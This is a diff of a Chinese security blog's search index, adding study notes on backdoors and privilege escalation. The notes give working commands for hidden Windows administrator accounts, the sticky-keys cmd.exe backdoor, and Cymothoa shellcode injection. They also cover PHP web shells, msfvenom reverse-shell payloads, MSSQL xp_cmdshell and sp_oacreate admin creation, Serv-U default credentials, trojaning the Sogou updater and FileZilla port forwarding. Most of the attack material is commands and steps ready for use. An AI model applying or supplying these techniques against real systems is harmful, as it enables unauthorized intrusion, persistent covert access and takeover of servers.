@@ -1,9 +1,82 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>提权与后门维持</title>
-    <url>/2020/04/01/%E6%8F%90%E6%9D%83%E4%B8%8E%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="提权与后门维持"><a href="#提权与后门维持" class="headerlink" title="提权与后门维持"></a>提权与后门维持</h1><ul>
+    <title>后门与权限维持</title>
+    <url>/2020/04/08/%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="后门与权限维持"><a href="#后门与权限维持" class="headerlink" title="后门与权限维持"></a>后门与权限维持</h1><ul>
+<li>后门，本意是指一座建筑背面开设的门，通常比较隐蔽，为进出建筑的人提供方便和隐蔽。在信息安全领域，后门是指绕过安全控制而获取对程序或系统访问权的方法。后门的最主要目的就是方便以后再次秘密进入或者控制系统。</li>
+</ul>
+<h3 id="1-账号隐藏后门"><a href="#1-账号隐藏后门" class="headerlink" title="1.账号隐藏后门"></a>1.账号隐藏后门</h3><p><code>net user hack$ 12345 /add</code><br><code>net localgroup administrators hack$ /add</code></p>
+<ul>
+<li>通过命令<code>net user</code>无法查看，但是<code>计算机管理-&gt;用户和用户组</code>可以看到</li>
+<li>通过注册表隐藏<code>计算机管理-&gt;用户和用户组</code>中的新增用户<ul>
+<li>打开注册表<code>regedit</code></li>
+<li>找到<code>HKEY_LOCAL_MACHINE\SAM\SAM</code>，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾应用后刷新</li>
+</ul>
+</li>
+<li><code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</code>点击<code>hack$</code>用户,得到在右边显示的键值中的“类型”一项显示为<code>0x3ec</code>，找到箭头所指目录。</li>
+<li>找到<code>administrator</code>所对应的的项为<code>000001F4</code>，将<code>000001F4</code>的F值复制到<code>000003EC</code>的F值中，保存。</li>
+<li>分别<code>hack$</code>和<code>000003EC</code>导出到桌面为<code>.reg</code>文件，删除<code>hack$</code>用户<code>net user hack$ /del</code></li>
+<li>将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。</li>
+</ul>
+<h3 id="2-粘滞键后门"><a href="#2-粘滞键后门" class="headerlink" title="2.粘滞键后门"></a>2.粘滞键后门</h3><p>在Windows系统下连续按5下SHIFT键，可以启动系统的粘滞键功能，其进程名为Sethc.exe，应用程序在Windows\system32下。使用cmd.exe替换Sethc.exe，3389登陆计算机时按下5次“shift”键即可进入cmd终端。</p>
+<h3 id="3-操作系统后门"><a href="#3-操作系统后门" class="headerlink" title="3.操作系统后门"></a>3.操作系统后门</h3><h4 id="3-1-msf模块中的metsvc"><a href="#3-1-msf模块中的metsvc" class="headerlink" title="3.1.msf模块中的metsvc"></a>3.1.msf模块中的<code>metsvc</code></h4><ul>
+<li>详细见msf后渗透一文</li>
+</ul>
+<h4 id="3-2-msf模块中的persistence"><a href="#3-2-msf模块中的persistence" class="headerlink" title="3.2.msf模块中的persistence"></a>3.2.msf模块中的<code>persistence</code></h4><ul>
+<li>详细见msf后渗透一文</li>
+</ul>
+<h4 id="3-3-Cymothoa后门"><a href="#3-3-Cymothoa后门" class="headerlink" title="3.3.Cymothoa后门"></a>3.3.Cymothoa后门</h4><p><em>主要用于linux服务器</em><br><a href="https://sourceforge.net/projects/cymothoa/?stars=3" target="_blank" rel="noopener">cymothoa下载地址</a></p>
+<ul>
+<li><p>cymothoa用法：</p>
+  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;cymothoa -p [执行宿主进程的pid] -s [执行shellcode的编号] -y [指定端口]</span><br><span class="line">.&#x2F;cymothoa -S 可查看shellcode的编号列表</span><br><span class="line">- p		#用来指定需要注入的进程的 pid</span><br><span class="line">- s		#用来指定使用 shellcode 的序号</span><br><span class="line">- y		#用来指定连接 shell 的端口，即别人连接自己时需要连接的端口</span><br><span class="line">运行后当出现 infected 即感染的意思则代表后门注入成功。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Cymothoa 是一款可以将 shellcode 注入到现有进程的（即插进程）后门工具。借助这种注入手段，它能够把shellcode伪装成常规程序。它所注入的后门程序应当能够与被注入的程序（进程）共存，以避免被管理和维护人员怀疑。将shellcode注入到其他进程，还有另外一项优势：即使目标系统的安全防护工具能够监视可执行程序的完整性，只要它不检测内存，那么它就不能发现（插进程）后门程序的进程。</p>
+</li>
+<li><p>因为时注入到其他进程，所以目标机重启后或者注入的进程关闭后门也会失效</p>
+</li>
+<li><p>操作过程：</p>
+<ul>
+<li>查看程序pid：<code>ps aux</code> <code>ps aux|grep /bin/bash</code>一般注入到bash进程中</li>
+<li>上传<code>cymothoa</code>压缩包到目标机，或者本地搭建web服务，目标机使用<code>wget</code>下载</li>
+<li>解压<code>cymothoa</code>并编译<code>gcc cycmothoa.c -o cycmothoa</code></li>
+<li>目标机上执行<code>./cymothoa -s 0 -p 需要注入的进程pid -y 4444</code></li>
+<li>本地执行nc主动连接<code>nc -nvv 4444</code>即可访问后门</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-WEB后门"><a href="#4-WEB后门" class="headerlink" title="4.WEB后门"></a>4.WEB后门</h3><h4 id="4-1-weevely"><a href="#4-1-weevely" class="headerlink" title="4.1.weevely"></a>4.1.weevely</h4><p><em>针对php平台</em></p>
+<ul>
+<li>生成：<code>weevely generate &lt;password&gt; &lt;path&gt;</code></li>
+<li>上传生成的脚本到web服务器上</li>
+<li>连接：<code>weevely &lt;URL&gt; &lt;password&gt; [cmd]</code></li>
+</ul>
+<h4 id="4-2-webacoo"><a href="#4-2-webacoo" class="headerlink" title="4.2.webacoo"></a>4.2.webacoo</h4><p><em>针对php平台</em></p>
+<ul>
+<li>生成：<code>webacoo -g -o &lt;path&gt;</code></li>
+<li>上传脚本</li>
+<li>连接：<code>webacoo -t -u &lt;url&gt;</code></li>
+</ul>
+<h4 id="4-3-meterpreter模块"><a href="#4-3-meterpreter模块" class="headerlink" title="4.3.meterpreter模块"></a>4.3.meterpreter模块</h4><ul>
+<li><code>msfvenom -p php/meterpreter/reverse_tcp lhost=xxxx lport=xxxx -f raw &gt; /root/msf.php</code></li>
+<li><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxxxx LPORT=xxxx -f aspx &gt; shell.aspx</code></li>
+</ul>
+<h3 id="5-上兴远控后门"><a href="#5-上兴远控后门" class="headerlink" title="5.上兴远控后门"></a>5.上兴远控后门</h3><ul>
+<li>图形化界面，操作简单</li>
+<li>生成后门文件，安装到目标机上</li>
+</ul>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>提权</title>
+    <url>/2020/04/01/%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul>
 <li>拿下网站!=拿下网站服务器；<br>  拿下网站=获得webshell，拿下网站服务器=拿下root（system）权限<br>  拿下网站服务器也不一定拿下网站，可能站库分离，有单独的数据库服务器</li>
 <li>网站webshell权限解析：<br>  一般情况下，webshell权限介于guests-users之间，权限较小<br>  非一般情况下，由以下两点决定：<ol>
 <li>脚本类型<br><strong>asp、php（小于users，匿名权限）&lt; aspx（users）&lt; jsp(system)</strong></li>
@@ -179,7 +252,7 @@
 </ul>
 </li>
 </ul>
-<h5 id="6-1-2nullevt-mof提权"><a href="#6-1-2nullevt-mof提权" class="headerlink" title="6.1.2nullevt.mof提权"></a>6.1.2nullevt.mof提权</h5><p><em>前提：1.windows2003及以下版本；2.mysql启动身份具有目录<code>c:/windows/system32/wbem/mof/</code>的读写权限；3.secure_file_priv参数值不为null。</em></p>
+<h5 id="6-1-2nullevt-mof提权"><a href="#6-1-2nullevt-mof提权" class="headerlink" title="6.1.2nullevt.mof提权"></a>6.1.2nullevt.mof提权</h5><p><em>前提：1.windows2003及以下版本；2.mysql启动身份具有目录<code>c:/windows/system32/wbem/mof/</code>的读写权限；3.secure_file_priv参数值不为null。(直接用mysql写入时的条件)</em></p>
 <ul>
 <li>mof文件是mysql数据库的扩展文件，路径<code>c:/windows/system32/wbem/mof/nullevt.mof</code>,叫做托管对象格式；其作用每隔5秒就去监控进程的创建和死亡。</li>
 <li><strong>原理</strong>：利用了<code>c:/windows/system32/wbem/mof/</code>目录下的 <code>nullevt.mof</code> 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。</li>
@@ -228,7 +301,7 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>使用xp_cmdshell提权</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user hack 12345 &#x2F;add&#39;    添加用户hack，密码12345</span><br><span class="line">exec master..xp_cmdshell &#39;net localgroup administrators hack add&#39;    添加hack用户到管理员组</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec master..xp_cmdshell &#39;net user hack 12345 &#x2F;add&#39;    &#x2F;&#x2F;添加用户hack，密码12345</span><br><span class="line">exec master..xp_cmdshell &#39;net localgroup administrators hack &#x2F;add&#39;    &#x2F;&#x2F;添加hack用户到管理员组</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>xp_cmshell关闭</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure</span><br></pre></td></tr></table></figure>
@@ -239,8 +312,51 @@
 <h5 id="6-2-2利用sp-oacreate提权"><a href="#6-2-2利用sp-oacreate提权" class="headerlink" title="6.2.2利用sp_oacreate提权"></a>6.2.2利用sp_oacreate提权</h5><ol>
 <li>sp_oacreate开启<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure;</span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,1;recofigure;</span><br></pre></td></tr></table></figure></li>
 <li>使用sp_oacreate提权<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c net user hack 123456 &#x2F;add&#39;</span><br><span class="line">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe &#x2F;c net localgroup administrators hack &#x2F;add&#39;</span><br></pre></td></tr></table></figure></li>
-<li>sp_pacreate关闭<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure;</span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,0;reconfigure;</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;,0;reconfigure;</span><br></pre></td></tr></table></figure></li>
+<li>sp_pacreate关闭<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec sp_configure &#39;show advanced options&#39;,1;reconfigure;</span><br><span class="line">exec sp_configure &#39;ole automation procedures&#39;,0;reconfigure;</span><br><span class="line">exec sp_configure &#39;show advanced options&#39;,0;reconfigure;</span><br></pre></td></tr></table></figure>
+
+</li>
 </ol>
+<h3 id="7-第三方软件漏洞提权"><a href="#7-第三方软件漏洞提权" class="headerlink" title="7.第三方软件漏洞提权"></a>7.第三方软件漏洞提权</h3><h4 id="7-1-FTP服务器软件Server-U"><a href="#7-1-FTP服务器软件Server-U" class="headerlink" title="7.1 FTP服务器软件Server-U"></a>7.1 FTP服务器软件Server-U</h4><ul>
+<li>默认端口:43958</li>
+<li>配置文件：<code>ServUDaemon.ini</code></li>
+</ul>
+<h5 id="7-1-1-webshell有权限修改配置文件"><a href="#7-1-1-webshell有权限修改配置文件" class="headerlink" title="7.1.1. webshell有权限修改配置文件"></a>7.1.1. webshell有权限修改配置文件</h5><ol>
+<li>修改domain添加用户：<code>user2=hack|1|0</code></li>
+<li>然后在ServUDaemon.ini文件尾部追下如下代码来添加用户的详细信息：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[USER&#x3D;spiger|1]</span><br><span class="line">Password&#x3D;md5加密后的密码</span><br><span class="line">HomeDir&#x3D;c:\</span><br><span class="line">RelPaths&#x3D;3</span><br><span class="line">TimeOut&#x3D;600</span><br><span class="line">Maintenance&#x3D;System</span><br><span class="line">Access1&#x3D;C:\|RWAMELCDP</span><br><span class="line">Access2&#x3D;d:\|RWAMELCDP</span><br><span class="line">Access3&#x3D;e:\|RWAMELCDP</span><br><span class="line">SKEYValues&#x3D;</span><br></pre></td></tr></table></figure></li>
+<li>使用添加的用户名密码登陆ftp服务器增加操作系统用户<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp&gt;quote site exec net user hack 123456 &#x2F;add</span><br><span class="line">ftp&gt;quote site exec net localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h5 id="7-1-2-webshell无权限修改配置文件-但是可以看到配置文件"><a href="#7-1-2-webshell无权限修改配置文件-但是可以看到配置文件" class="headerlink" title="7.1.2. webshell无权限修改配置文件,但是可以看到配置文件"></a>7.1.2. webshell无权限修改配置文件,但是可以看到配置文件</h5><ul>
+<li>查看配置文件<code>ServUDaemon.ini</code>，找到system权限的ftp用户并把密码md5解密。</li>
+<li>使用已知的ftp系统用户名密码添加操作系统用户 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp&gt;quote site exec net user hack 123456 &#x2F;add</span><br><span class="line">ftp&gt;quote site exec net localgroup administrators hack &#x2F;add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h5 id="7-1-3-serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权"><a href="#7-1-3-serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权" class="headerlink" title="7.1.3. serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权"></a>7.1.3. serv-u配置文件无修改权限，可以用Serv-u管理用户来进行提权</h5><ul>
+<li>最常用的方法，一般大马中集成的serv-u提权方法就是本方法</li>
+<li>serv-u的默认管理端口是43958，只有本地才能进行连接这个管理端口。serv-u默认管理账号是<code>LocalAdministrator</code>,默认密码是<code>#l@$ak#.lk;0@P</code>，这个密码是固定的。如果网站管理员忘记修改密码，那么获取webshell后就可以连接该端口后执行命令来添加系统用户。</li>
+<li>网站管理员很少修改serv-u的这个默认管理账号和口令，但是如果管理员修改了，我们还可以通过查看ServUAdmin.exe文件来获取管理账号和口令。方法如下：下载serv-u目录下的ServUAdmin.exe文件，在本地用winhex打开，查找LocalAdministrator字符来获取口令位置，通常可以看到serv-u的管理账号和口令都在文件中，仔细查找即可（如果连用户名也修改了，就搜127.0.0.1或记住账号和密码在文件中的位置）。获取管理账号和口令后就可以利用大马自带的serv-u来进行提权了。</li>
+</ul>
+<h4 id="7-2-sougou输入法提权"><a href="#7-2-sougou输入法提权" class="headerlink" title="7.2 sougou输入法提权"></a>7.2 sougou输入法提权</h4><ul>
+<li>搜狗低版本输入法根目录下有一个：<code>PinyinUp.exe</code>是用来更新词典用的，管理员为了保存词库，有可能会把搜狗输入法安装到D盘，搜狗输入法目录默认是Everyone可读可写，搜狗每隔一段时间就会自动升级，而升级的文件是PinyinUp.exe，我们直接对PinyinUp.exe 文件捆绑上远控等下次重启就会上线了。我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</li>
+<li><code>.bat</code>批处理文件使用工具生成<code>.exe</code>文件<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">@<span class="built_in">net</span> user hack <span class="number">12345</span> /add</span><br><span class="line">@<span class="built_in">net</span> localgroup administrators hack /add</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h4 id="7-3-filezilla提权"><a href="#7-3-filezilla提权" class="headerlink" title="7.3. filezilla提权"></a>7.3. filezilla提权</h4><ul>
+<li>ftp软件</li>
+<li>默认监听端口：14147（只监听本地端口）</li>
+<li>重要文件：管理文件<code>FileZilla Server Interface.xml</code> 用户文件<code>FileZilla Server.xml</code></li>
+<li>操作流程：<ul>
+<li>查找重要文件，查看管理员密码</li>
+<li>端口转发（因为只监听本地端口）<code>lcx.exe -tran 14148 127.0.0.1 14147</code>把任意地址的14148端口连接转发到本地的14147端口</li>
+<li>本地通过 FileZilla 的服务端程序，来连接它，地址为目标机地址，端口为14148，密码为之前查看的密码</li>
+<li>使用FileZilla 的服务端程序添加ftp用户，并将分享目录设置为<code>C:\</code>盘，赋予足够大的权限。</li>
+<li>使用ftp客户端软件连接</li>
+</ul>
+</li>
+</ul>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -448,7 +564,7 @@
 <li>使用proxychains连接代理<br>配置proxychains文件<br><img src="/pic/proxy.png" alt="proxy.png"><br>使用proxychains，此时无视防火墙规则<br><code>proxychains rdesktop -u Administrator -p Windows2008 10.10.10.102</code><br><img src="/pic/proxychain.png" alt="proxychain.png"></li>
 </ul>
 <h2 id="七-后门"><a href="#七-后门" class="headerlink" title="七.后门"></a>七.后门</h2><p><em>Meterpreter仅仅是在内存中驻留的Shellcode，只要目标机器重启就会丧失控制权</em></p>
-<h3 id="1-metsvc"><a href="#1-metsvc" class="headerlink" title="1.metsvc"></a>1.metsvc</h3><p>受防火墙限制，任何人都能连接，不好用，建议使用persistence</p>
+<h3 id="1-metsvc"><a href="#1-metsvc" class="headerlink" title="1.metsvc"></a>1.metsvc</h3><p>受防火墙限制，任何人都能连接，并且针对服务器版本的系统，不好用，建议使用persistence</p>
 <ul>
 <li><p><code>run metsvc</code></p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run metsvc -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;persistence_exe.</span><br><span class="line">[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe OPTION&#x3D;value [...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -A        Automatically start a matching exploit&#x2F;multi&#x2F;handler to connect to the service</span><br><span class="line">    -h        This help menu</span><br><span class="line">    -r        Uninstall an existing Meterpreter service (files must be deleted manually)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;persistence_exe.</span><br><span class="line">[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe OPTION&#x3D;value [...]</span><br><span class="line">[*] Creating a meterpreter service on port 31337</span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\1\PyaKFDRuPa...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc-server.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">    * Installing service metsvc</span><br><span class="line">* Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>
